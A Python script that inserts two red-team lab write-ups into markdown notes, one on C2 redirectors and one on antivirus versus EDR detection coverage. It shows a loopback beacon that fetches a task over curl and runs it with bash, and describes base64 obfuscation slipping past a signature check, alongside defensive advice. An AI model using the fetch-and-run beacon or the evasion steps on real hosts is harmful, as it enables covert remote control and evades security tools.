#!/usr/bin/env python3
"""Offensive Security worked examples — batch 12 (C2 + AV/EDR)."""
import re
import sys

C2 = '''## Worked Example: An Agent That Never Talks to the Control Server

A C2 redirector exists so that the thing the defender can see — the address the
agent beacons to — is never the thing worth protecting. Modelling an agent, a
redirector, and a hidden control plane on loopback shows the indirection and the
signal it does and does not hide.

**The topology** is three parties: the agent beacons to the redirector, the
redirector forwards one specific path to the control server, and the control
server is never contacted directly.

**Default-deny at the redirector** is what makes it more than a proxy:

```shell-session
operator@lab:/tmp/c2-lab$ curl -s -o /dev/null -w "GET /random -> HTTP %{http_code}\\n" http://127.0.0.1:9100/random
GET /random -> HTTP 404
```

Anything that is not the agreed beacon path gets a decoy 404. A defender or a
curious scanner poking the redirector sees an unremarkable web server that serves
nothing interesting, because the policy forwards exactly one path and denies the
rest.

**The beacon** retrieves a task and runs it, having spoken only to the redirector:

```shell-session
operator@lab:/tmp/c2-lab$ TASK=$(curl -s http://127.0.0.1:9100/beacon); echo "task: $TASK"
task: echo CANARY-TASK-EXECUTED
operator@lab:/tmp/c2-lab$ bash -c "$TASK"
CANARY-TASK-EXECUTED
```

The agent's entire world is `127.0.0.1:9100`. The real control plane on `:9101`
issued the task, but the agent has no knowledge of it and never connected to it —
so seizing or blocking the redirector's address, which is the only one visible in
the agent, costs the operator a disposable forwarder and reveals nothing about the
control server behind it.

**What the indirection does not hide** is the behaviour, and an authorized
operation records exactly that:

```shell-session
operator@lab:/tmp/c2-lab$ cat audit.log
check-in 127.0.0.1 /task
```

The control plane logged the check-in — the transparency an authorized engagement
requires. And the defender's signal survives every layer of redirection: a host
that reaches out to the same external address on a regular cadence is beaconing,
whatever clever infrastructure sits on the far end. Redirectors protect the
*operator's* infrastructure from discovery; they do nothing to hide the *client
host's* periodic outbound connection, which is why egress control and beacon-cadence
detection — jitter analysis, destination rarity, regular small requests — are the
defences that actually engage the technique rather than the plumbing.

'''

AVEDR = '''## Worked Example: A Coverage Matrix Across Two Detection Layers

Evasion testing produces one deliverable above all others: a matrix of which
payload variant each defensive layer catches. Two miniature detectors — one static
like classic AV, one behavioural like an EDR — turn that abstract claim into a
table the client can act on.

**Static detection against the raw payload** — a signature is a literal match:

```shell-session
operator@lab:/tmp/av-lab$ ./av_static.sh payload.sh
AV: SIGNATURE MATCH -> blocked
```

The raw payload contains the string the signature looks for, so the static layer
stops it. This is the case AV was built for and handles well: known-bad bytes,
recognised on sight.

**Static detection against an obfuscated payload** — same behaviour, new bytes:

```shell-session
operator@lab:/tmp/av-lab$ ./av_static.sh payload_obf.sh
AV: no signature match -> allowed
```

Base64-encoding the payload changed every byte the signature keyed on, and the
static layer waves it through. On its own, that is the well-known limitation of
signature matching — and where an evasion test would stop if the client only ran
AV.

**Behavioural detection against the same obfuscated payload:**

```shell-session
operator@lab:/tmp/av-lab$ ./edr_behavioral.sh payload_obf.sh
EDR: BEHAVIOR MATCH (decode->shell) -> detected
```

The obfuscation that defeated the signature is itself the behavioural signal — a
decode piped straight into a shell. The bytes changed; the action did not; the
behavioural layer watches the action.

**The matrix is the finding**, and it is what the client's report should contain:

| Variant | Static (AV) | Behavioural (EDR) |
|:--|:--|:--|
| Raw payload | caught | caught |
| Obfuscated | **missed** | caught |

Read across the obfuscated row: the organisation is protected here only because a
behavioural layer exists. An environment running signature AV alone has a hole in
the exact place attackers operate, and the recommendation follows directly — the
controls that hold are behavioural detection, plus the platform telemetry that
feeds it. On Windows those are named: AMSI, which hands the *decoded* script back
to the scanner so obfuscation no longer helps, and ETW, which surfaces the process
and syscall behaviour the signature never sees. The value of the exercise is not
"we evaded the AV" — it is the per-layer coverage map that tells the defender which
control is load-bearing and which is theatre.

'''

WORK = {
    "Offensive Security/Red Team Operations/C2 Infrastructure & Operational Security/C2 Infrastructure & Redirectors.md": C2,
    "Offensive Security/Red Team Operations/Evasion & Endpoint Tradecraft/AV, EDR & Telemetry Evasion Testing.md": AVEDR,
}

ANCHOR = re.compile(r"^## Task \d+ — (Failure Modes|Security Implications|Detection|Defen|Reporting)", re.M)
ANY_TASK = re.compile(r"^## Task \d+ — (.*)$", re.M)


def main():
    apply = "--apply" in sys.argv
    for rel, sec in WORK.items():
        try:
            src = open(rel, encoding="utf-8").read()
        except FileNotFoundError:
            print(f"  MISSING  {rel}")
            continue
        m = ANCHOR.search(src)
        if not m:
            print(f"  ✗ NO ANCHOR  {rel}")
            continue
        out = src[:m.start()] + sec + src[m.start():]
        out = out.replace("## Worked Example:", "## Task 0 — Worked Example:", 1)
        n = [0]

        def renum(mm):
            n[0] += 1
            return f"## Task {n[0]} — {mm.group(1)}"

        out = ANY_TASK.sub(renum, out)
        print(f"  ✓ {n[0]} tasks  {rel.split('/')[-1]}")
        if apply:
            open(rel, "w", encoding="utf-8").write(out)
    print(f"\n{'APPLIED' if apply else 'DRY RUN'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
